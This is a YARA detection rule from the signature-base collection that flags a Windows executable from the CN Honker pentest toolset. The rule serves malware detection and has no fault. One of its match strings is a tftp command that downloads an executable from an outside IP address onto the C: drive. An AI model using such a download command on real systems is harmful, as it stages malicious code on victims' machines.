rule CN_Honker_D_injection_V2_32
{
	meta:
		description = "Sample from CN Honker Pentest Toolset - file D_injection_V2.32.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "3a000b976c79585f62f40f7999ef9bdd326a9513"
		os = "windows"
		filetype = "executable"

	strings:
		$s0 = "Missing %s property(CommandText does not return a result set{Error creating obje" wide
		$s1 = "/tftp -i 219.134.46.245 get 9493.exe c:\\9394.exe" fullword ascii

	condition:
		uint16(0)==0x5a4d and filesize <5000KB and all of them
}
